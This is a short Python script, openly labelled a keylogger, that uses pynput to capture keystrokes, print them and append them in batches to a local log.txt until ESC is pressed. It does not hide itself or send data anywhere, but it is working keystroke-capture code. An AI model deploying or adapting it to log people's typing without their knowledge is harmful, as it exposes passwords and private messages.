import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    try:
        keys.append(key)
        count += 1
        print(f"{key} pressed")

        if count >= 10:
            count = 0
            write_file(keys)
            keys = []
    except Exception as e:
        print(f"Error: {e}")

def write_file(keys):
    with open("log.txt", "a", encoding="utf-8") as f:
        for key in keys:
            # Handle special keys properly
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            elif key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("\t")
            elif key == Key.backspace:
                f.write("[BACKSPACE]")
            elif key == Key.esc:
                f.write("[ESC]")
            # You can add more special keys as needed

        # Optional: add newline after batch for readability
        f.write("\n")

def on_release(key):
    if key == Key.esc:
        # Stop listener when ESC is pressed
        print("Stopping keylogger...")
        write_file(keys)  # Save remaining keys
        return False

print("Keylogger started. Press ESC to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()